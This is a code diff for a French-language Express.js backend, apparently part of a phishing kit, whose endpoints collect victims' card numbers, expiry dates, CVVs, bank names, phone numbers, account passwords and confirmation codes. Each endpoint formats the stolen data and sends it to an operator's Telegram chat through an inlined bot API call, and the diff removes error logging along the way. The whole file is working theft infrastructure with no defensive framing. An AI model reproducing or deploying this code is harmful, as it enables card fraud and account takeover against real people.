@@ -2,6 +2,7 @@
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
+const https = require('https');
 
 const app = express();
 
@@ -26,13 +27,51 @@ app.use((req, res, next) => {
   next();
 });
 
-// Import Telegram Service
-let telegramService;
-try {
-  telegramService = require('../backend-nodejs/telegramService');
-} catch (e) {
-  console.error('Error loading telegramService:', e.message);
-}
+// Telegram Service inline
+const sendTelegramMessage = (text) => {
+  return new Promise((resolve, reject) => {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    
+    if (!token || !chatId) {
+      reject(new Error('Missing Telegram config'));
+      return;
+    }
+
+    const payload = JSON.stringify({
+      chat_id: chatId,
+      text: text,
+      parse_mode: 'HTML'
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${token}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(payload)
+      }
+    };
+
+    const req = https.request(options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+        try {
+          const response = JSON.parse(data);
+          resolve(response);
+        } catch (e) {
+          reject(e);
+        }
+      });
+    });
+
+    req.on('error', reject);
+    req.write(payload);
+    req.end();
+  });
+};
 
 // ==================== ROUTES ====================
 
@@ -41,7 +80,6 @@ app.get('/', (req, res) => {
   try {
     res.render('index');
   } catch (err) {
-    console.error('Error rendering index:', err);
     res.status(500).json({ error: 'Error rendering page' });
   }
 });
@@ -80,156 +118,66 @@ app.get('/troisieme', (req, res) => {
 
 // ==================== API ENDPOINTS ====================
 
-// Send agreement
 app.post('/api/send-agreement', async (req, res) => {
   try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
-    const data = {
-      step: 'Accord',
-      ip: req.clientIP,
-      userAgent: req.userAgent,
-      timestamp: new Date().toISOString()
-    };
-
-    await telegramService.sendAgreementConfirmation(data);
-    res.json({ success: true, message: 'Accord enregistré' });
+    const message = `<b>✅ CONDITIONS ACCEPTÉES</b>\n━━━━━━━━━━━━━━━━\n📋 Accord enregistré\n⏰ ${new Date().toLocaleString('fr-FR')}\n🌐 IP: ${req.clientIP}`;
+    await sendTelegramMessage(message);
+    res.json({ success: true });
   } catch (error) {
-    console.error('Error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Send form data
 app.post('/api/send-form', async (req, res) => {
   try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
     const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;
-
-    const data = {
-      step: 'Première - Formulaire',
-      titulaire,
-      cardNumber,
-      expiryDate,
-      bank,
-      telephone,
-      ip: req.clientIP,
-      userAgent: req.userAgent,
-      timestamp: new Date().toISOString()
-    };
-
-    await telegramService.sendFormData(data);
-    res.json({ success: true, message: 'Données reçues' });
+    const message = `<b>💳 DONNÉES BANCAIRES</b>\n━━━━━━━━━━━━━━━━\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🏦 ${bank}\n📱 ${telephone}\n🌐 IP: ${req.clientIP}`;
+    await sendTelegramMessage(message);
+    res.json({ success: true });
   } catch (error) {
-    console.error('Error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Send CVV
 app.post('/api/send-cvv', async (req, res) => {
   try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
     const { cvv, titulaire, cardNumber, expiryDate } = req.body;
-
-    const data = {
-      cvv,
-      titulaire,
-      cardNumber,
-      expiryDate,
-      ip: req.clientIP,
-      userAgent: req.userAgent,
-      timestamp: new Date().toISOString()
-    };
-
-    await telegramService.sendCVVAlert(data);
-    res.json({ success: true, message: 'CVV enregistré' });
+    const message = `<b>🔐 CVV REÇU</b>\n━━━━━━━━━━━━━━━━\n🔑 ${cvv}\n👤 ${titulaire}\n💳 ${cardNumber}\n📅 ${expiryDate}\n🌐 IP: ${req.clientIP}`;
+    await sendTelegramMessage(message);
+    res.json({ success: true });
   } catch (error) {
-    console.error('Error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Verify identity
 app.post('/api/verify-identity', async (req, res) => {
   try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
     const { identifier, password } = req.body;
-
-    const data = {
-      step: 'Troisième - Identité',
-      identifier,
-      password,
-      ip: req.clientIP,
-      userAgent: req.userAgent,
-      timestamp: new Date().toISOString()
-    };
-
-    await telegramService.sendIdentityData(data);
-    res.json({ success: true, message: 'Identité vérifiée' });
+    const message = `<b>🔐 IDENTITÉ</b>\n━━━━━━━━━━━━━━━━\n👤 ${identifier}\n🔑 ${password}\n🌐 IP: ${req.clientIP}`;
+    await sendTelegramMessage(message);
+    res.json({ success: true });
   } catch (error) {
-    console.error('Error:', error);
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Send confirmation
 app.post('/api/send-confirmation', async (req, res) => {
   try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
     const { confirmationCode } = req.body;
-
-    const data = {
-      step: 'Quatrième - Confirmation',
-      confirmationCode,
-      ip: req.clientIP,
-      userAgent: req.userAgent,
-      timestamp: new Date().toISOString()
-    };
-
-    await telegramService.sendConfirmationData(data);
-    res.json({ success: true, message: 'Confirmation reçue' });
-  } catch (error) {
-    console.error('Error:', error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-// Test Telegram
-app.post('/api/test-telegram', async (req, res) => {
-  try {
-    if (!telegramService) throw new Error('Telegram service not initialized');
-    
-    const result = await telegramService.testConnection();
-    res.json({ success: result, message: result ? 'Connexion OK' : 'Erreur de connexion' });
+    const message = `<b>✔️ CONFIRMATION</b>\n━━━━━━━━━━━━━━━━\n📩 ${confirmationCode}\n🌐 IP: ${req.clientIP}`;
+    await sendTelegramMessage(message);
+    res.json({ success: true });
   } catch (error) {
     res.status(500).json({ success: false, error: error.message });
   }
 });
 
-// Health check
 app.get('/api/health', (req, res) => {
-  res.json({ 
-    status: 'OK', 
-    timestamp: new Date().toISOString(),
-    environment: 'vercel',
-    telegramReady: !!telegramService
-  });
+  res.json({ status: 'OK', environment: 'vercel' });
 });
 
-// 404 handler
 app.use((req, res) => {
-  res.status(404).json({ error: 'Route not found' });
-});
-
-// Error handler
-app.use((err, req, res, next) => {
-  console.error('Server error:', err);
-  res.status(500).json({ error: 'Internal server error' });
+  res.status(404).json({ error: 'Not found' });
 });
 
 module.exports = app;
